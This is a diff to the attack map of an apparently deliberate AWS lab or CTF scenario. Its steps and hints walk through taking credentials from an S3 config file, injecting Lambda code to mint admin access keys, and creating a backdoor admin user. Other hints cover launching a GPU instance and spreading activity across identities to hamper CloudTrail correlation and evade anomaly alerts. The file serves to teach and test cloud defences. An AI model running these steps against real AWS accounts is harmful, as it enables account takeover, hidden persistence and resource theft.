@@ -146,11 +146,8 @@ attackMap:
         - description: "Extract the embedded credentials"
           command: "cat /tmp/rag-pipeline-config.json | jq '{access_key: .pipeline_auth.aws_access_key_id, secret_key: .pipeline_auth.aws_secret_access_key}'"
       hints:
-        - "Your starting user has read access to an S3 bucket. Enumerate its contents — data pipeline buckets often contain configuration files that developers embed credentials in for convenience."
-        - "Use s3:ListBucket to see what files exist in the bucket. Look for configuration or settings files at any path depth."
-        - "Once you find a configuration file, download it and look for any AWS credential fields — access key IDs start with AKIA or ASIA."
-        - "Pipeline configuration files often contain credentials embedded as JSON fields with names like aws_access_key_id, access_key, or similar variations."
-        - "After extracting the credentials, test them with sts:GetCallerIdentity to identify the new principal before proceeding."
+        - "Use s3:ListBucket to enumerate the bucket recursively, then s3:GetObject to download any configuration files you find — look for JSON fields like aws_access_key_id or aws_secret_access_key."
+        - "Access key IDs start with AKIA (long-term) or ASIA (temporary). Once you find credentials, export them and verify with sts:GetCallerIdentity."
 
     - from: rag-bucket
       to: compromised-user
@@ -176,12 +173,7 @@ attackMap:
         - description: "Attempt role assumptions — admin/Administrator fail, others succeed"
           command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/admin --role-session-name test 2>&1 || echo 'FAILED as expected'\naws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role --role-session-name recon"
       hints:
-        - "You now have credentials for a more capable user. Start with sts:GetCallerIdentity to confirm your new identity, then enumerate your environment methodically."
-        - "Use iam:ListUsers to discover all users in the account. Look for usernames that suggest administrative roles — the original attacker specifically searched for admin-sounding names."
-        - "For each interesting user, use iam:ListAttachedUserPolicies to check if they have AdministratorAccess or other broad policies attached."
-        - "Use lambda:ListFunctions to discover what Lambda functions exist. Pay close attention to the Role field — a Lambda whose execution role name suggests system-level access is worth investigating further."
-        - "Use lambda:GetFunction on interesting functions to see their full configuration, including the execution role ARN. Then use iam:GetRole to inspect what that role's trust policy and permissions look like."
-        - "Try assuming roles in the account. Failed assumptions (for roles like 'admin' or 'Administrator') narrow down where not to focus. Successful assumptions expand your visibility for reconnaissance."
+        - "Export the credentials from the config file and verify with sts:GetCallerIdentity. This user has lambda:UpdateFunctionCode and lambda:InvokeFunction — use them to inject code into a Lambda whose execution role holds iam:CreateAccessKey."
 
     - from: compromised-user
       to: ec2-init-lambda
@@ -201,9 +193,9 @@ attackMap:
         - description: "Set the target environment variable to admingh"
           command: "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-admingh}'"
       hints:
-        - "You have lambda:UpdateFunctionCode and lambda:InvokeFunction on pl-prod-8min-ec2-init. The function's execution role can create access keys for IAM users. Think about what you can do by replacing the function's code."
-        - "Write a Python Lambda handler that calls boto3's iam.create_access_key() with a target username. The handler will execute with the permissions of the Lambda execution role — not your current user."
-        - "Zip the handler, upload it with lambda:UpdateFunctionCode, then use lambda:UpdateFunctionConfiguration to set an environment variable with the target username. This avoids hardcoding the target in the zip."
+        - "Fetch the existing function configuration to confirm the handler name, then write a Python handler that calls boto3's iam.create_access_key() with a target username read from an environment variable. Zip and upload with lambda:UpdateFunctionCode, then set the target via lambda:UpdateFunctionConfiguration so you can retarget without re-uploading."
+        - "Invoke the function and parse the JSON response for AccessKeyId and SecretAccessKey. Lambda returns HTTP 200 even when the handler throws — always check the response body. If the first target's keys have no useful permissions, update the environment variable to the admin user and invoke again."
+        - "Lambda code updates are not instantaneous — wait a few seconds after lambda:UpdateFunctionCode before invoking to ensure the new handler is active."
 
     - from: ec2-init-lambda
       to: ec2-init-role
@@ -225,10 +217,7 @@ attackMap:
           command: "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-frick}'"
         - description: "Invoke with frick — admin access keys returned"
           command: "aws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_frick.json\ncat /tmp/lambda_response_frick.json"
-      hints:
-        - "The Lambda's execution role is what gives the injected code its power. The attacker's own user cannot call iam:CreateAccessKey directly, but the execution role can."
-        - "Your first target might not have useful permissions even if key creation succeeds — the execution role can create keys for multiple users. Target the admin user."
-        - "After invoking the function, parse the JSON response to extract the AccessKeyId and SecretAccessKey."
+      hints: []
 
     - from: ec2-init-role
       to: frick-admin-user
@@ -259,11 +248,9 @@ attackMap:
         - description: "Launch GPU instance (p3.2xlarge) with 2-hour auto-shutdown"
           command: "aws ec2 create-key-pair --key-name pl-8min-attack-key --query 'KeyMaterial' --output text > /tmp/pl-8min-attack-key.pem\nSG_ID=$(aws ec2 create-security-group \\\n  --group-name pl-8min-attack-sg \\\n  --description 'Attack GPU instance SG' \\\n  --query 'GroupId' --output text)\naws ec2 authorize-security-group-ingress \\\n  --group-id $SG_ID \\\n  --protocol tcp --port 22 --cidr 0.0.0.0/0\naws ec2 run-instances \\\n  --image-id ami-0c02fb55956c7d316 \\\n  --instance-type p3.2xlarge \\\n  --key-name pl-8min-attack-key \\\n  --security-group-ids $SG_ID \\\n  --user-data 'IyEvYmluL2Jhc2gKc2h1dGRvd24gLWggKzEyMA==' \\\n  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu}]'"
       hints:
-        - "You now have access keys for frick — an admin user. Start by verifying the identity and confirming full access, then focus on establishing persistence before doing anything else."
-        - "Create a backdoor IAM user with AdministratorAccess as a persistent foothold. This mirrors what the original attacker did: create a new user + attach AdministratorAccess in rapid succession."
-        - "The account has Bedrock-enabled users. Check whether Bedrock model invocation logging is enabled before invoking models — the original attacker checked this to assess detection risk."
-        - "After collecting credentials and data, the original attacker launched a GPU instance for ML model training. The instance type matters: p-series instances are GPU-accelerated and expensive. Always terminate GPU instances immediately after demo."
-        - "Cross-account role assumption will fail — the original attack included attempts against hallucinated account IDs that all returned AccessDenied. Run the attempts to replicate the attack fidelity, then continue with data collection."
+        - "Export frick's credentials and create a backdoor IAM user with AdministratorAccess immediately — this mirrors the original attacker's first persistence move."
+        - "Check whether Bedrock model invocation logging is enabled before invoking models; the original attacker inspected this to assess detection risk before calling bedrock-runtime."
+        - "Always terminate GPU instances (p3.2xlarge) immediately after demo — they are expensive and the demo includes launching one to replicate the original attack."
 
     - from: frick-admin-user
       to: persistence-identities
@@ -284,9 +271,8 @@ attackMap:
         - description: "Create backdoor admin user with persistent access"
           command: "aws iam create-user --user-name backdoor-admin\naws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name backdoor-admin"
       hints:
-        - "After gaining admin, the priority is persistence. Spread across as many identities as possible so that revoking one doesn't cut off access."
-        - "Assume roles with different session names to distribute CloudTrail entries — this makes incident response harder because the same role appears under multiple session identifiers."
-        - "Create access keys for pre-existing service accounts. These are less likely to trigger alerts than newly created users because the accounts already have established usage patterns."
+        - "Assume roles with different session names (explore, test, pwned, escalation) to distribute CloudTrail entries across principal identifiers, making correlation harder during incident response."
+        - "Create access keys for pre-existing service accounts rather than only newly created users — established accounts have normal usage patterns that are less likely to trigger anomaly alerts."
 
     - from: frick-admin-user
       to: ctf-flag
